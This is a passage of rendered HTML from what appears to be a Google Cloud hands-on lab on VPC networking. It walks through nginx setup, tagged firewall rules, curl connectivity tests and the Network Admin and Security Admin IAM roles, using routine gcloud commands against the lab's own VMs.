cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat /var/www/html/index.nginx-debian.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should contain the following:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;h1&gt;Welcome to the green server!&lt;/h1&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">working. Further configuration is required.&lt;/p&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>Close the SSH terminal to </span><strong><span>green</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='test-completed-task-17'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have completed the task successfully you will be granted an assessment score.</span></p><p><span>Install Nginx and customize the welcome page.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-create-the-firewall-rule'><span>Task 2. Create the firewall rule</span></h2><p><span>Create the tagged firewall rule and test HTTP connectivity.</span></p><h3 id='create-the-tagged-firewall-rule'><span>Create the tagged firewall rule</span></h3><p><span>Create a firewall rule that applies to VM instances with the </span><strong><span>web-server</span></strong><span> network tag.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>Notice the </span><strong><span>default-allow-internal</span></strong><span> firewall rule.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The </span><strong><span>default-allow-internal</span></strong><span> firewall rule allows traffic on all protocols/ports within the </span><strong><span>default</span></strong><span> network. You want to create a firewall rule to allow traffic from outside this network to only the </span><strong><span>blue</span></strong><span> server, by using the network tag </span><strong><span>web-server</span></strong><span>.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults.</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>allow-http-web-server</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>web-server</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><span>0.0.0.0/0</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> tcp, </span><em><span>type:</span></em><span> 80; and </span><em><span>check</span></em><span> Other protocols, </span><em><span>type:</span></em><span> icmp.</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> Make sure to include the </span><strong><span>/0</span></strong><span> in the </span><strong><span>Source IP ranges</span></strong><span> to specify all networks.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='test-completed-task-18'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have completed the task successfully you will be granted an assessment score.</span></p><p><span>Create the tagged firewall rule.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='create-a-test-vm'><span>Create a test-vm</span></h3><p><span>Create a </span><strong><span>test-vm</span></strong><span> instance using the Cloud Shell command line.</span></p><ol start='' ><li><p><span>Open a new Cloud Shell terminal.</span></p></li><li><p><span>Run the following command to create a </span><strong><span>test-vm</span></strong><span> instance, in the </span><code>ZONE</code><span> zone:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create test-vm --machine-type=e2-micro --subnet=default --zone=ZONE</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; ZONE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MACHINE_TYPE  PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP &nbsp;  STATUS</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">test-vm  ZONE  e2-micro &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10.142.0.4 &nbsp; 35.237.134.68  RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> You can easily create VM instances from the Console or the gcloud command line.</span></p><h4 id='test-completed-task-19'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have completed the task successfully you will be granted an assessment score.</span></p><p><span>Create a test-vm.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='test-http-connectivity'><span>Test HTTP connectivity</span></h3><p><span>From the </span><strong><span>test-vm</span></strong><span>, </span><code>curl</code><span> the internal and external IP addresses of </span><strong><span>blue</span></strong><span> and </span><strong><span>green</span></strong><span>.</span></p><ol start='' ><li><p><span>In the Console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Note the internal and external IP addresses of </span><strong><span>blue</span></strong><span> and </span><strong><span>green</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>test-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>To test HTTP connectivity to </span><strong><span>blue</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>blue</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl &lt;Enter blue's internal IP here&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see the </span><code>Welcome to the blue server!</code><span> header.</span></p><ol start='' ><li><p><span>To test HTTP connectivity to </span><strong><span>green</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>green</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -c 3 &lt;Enter green's internal IP here&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see the </span><code>Welcome to the green server!</code><span> header.</span></p><p><strong><span>Note:</span></strong><span> You are able to HTTP access both servers using their internal IP addresses. The connection on tcp:80 is allowed by the </span><strong><span>default-allow-internal</span></strong><span> firewall rule, as </span><strong><span>test-vm</span></strong><span> is on the same VPC network as the web server&#39;s </span><strong><span>default</span></strong><span> network.</span></p><ol start='' ><li><p><span>To test HTTP connectivity to </span><strong><span>blue</span></strong><span>&#39;s external IP, run the following command, replacing </span><strong><span>blue</span></strong><span>&#39;s external IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl &lt;Enter blue's external IP here&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see the </span><code>Welcome to the blue server!</code><span> header.</span></p><ol start='' ><li><p><span>To test HTTP connectivity to </span><strong><span>green</span></strong><span>&#39;s external IP, run the following command, replacing </span><strong><span>green</span></strong><span>&#39;s external IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -c 3 &lt;Enter green's external IP here&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> This should not work! The request hangs.</span></p><ol start='' ><li><p><span>Press </span><strong><span>CTRL+c</span></strong><span> to stop the HTTP request.</span></p></li></ol><p><strong><span>Note:</span></strong><span> As expected, you are only able to HTTP access the external IP address of the </span><strong><span>blue</span></strong><span> server as the </span><strong><span>allow-http-web-server</span></strong><span> only applies to VM instances with the </span><strong><span>web-server</span></strong><span> tag.</span></p><p><span>You can verify the same behavior from your browser by opening a new tab and navigating to </span><code>http://[External IP of server]</code><span>.</span></p><h2 id='task-3-explore-the-network-and-security-admin-roles'><span>Task 3. Explore the Network and Security Admin roles</span></h2><p><span>Cloud IAM lets you authorize who can take action on specific resources, giving you full control and visibility to manage cloud resources centrally. The following roles are used in conjunction with single-project networking to independently control administrative access to each VPC Network:</span></p><ul><li><p><strong><span>Network Admin</span></strong><span>: Permissions to create, modify, and delete networking resources, except for firewall rules and SSL certificates.</span></p></li><li><p><strong><span>Security Admin</span></strong><span>: Permissions to create, modify, and delete firewall rules and SSL certificates.</span></p></li></ul><p><span>Explore these roles by applying them to a service account, which is a special Google account that belongs to your VM instance, instead of to an individual end user. Rather than creating a new user, you will authorize </span><strong><span>test-vm</span></strong><span> to use the service account to demonstrate the permissions of the </span><strong><span>Network Admin</span></strong><span> and </span><strong><span>Security Admin</span></strong><span> roles.</span></p><h3 id='verify-current-permissions'><span>Verify current permissions</span></h3><p><span>Currently, </span><strong><span>test-vm</span></strong><span> uses the </span><a href='https://cloud.google.com/compute/docs/access/service-accounts#compute_engine_default_service_account'><span>Compute Engine default service account</span></a><span>, which is enabled on all instances created by Cloud Shell command-line and the Cloud Console.</span></p><p><span>Try to list or delete the available firewall rules from </span><strong><span>test-vm</span></strong><span>.</span></p><ol start='' ><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of the </span><strong><span>test-vm</span></strong><span> instance.</span></p></li><li><p><span>Try to list the available firewall rules:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ERROR: (gcloud.compute.firewall-rules.list) Some requests did not succeed:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - Insufficient Permission</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> This should not work!</span></p><ol start='' ><li><p><span>Try to delete the </span><strong><span>allow-http-web-server</span></strong><span> firewall rule:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules delete allow-http-web-server</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Enter </span><strong><span>Y</span></strong><span>, if asked to continue.</span></p></li></ol><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; 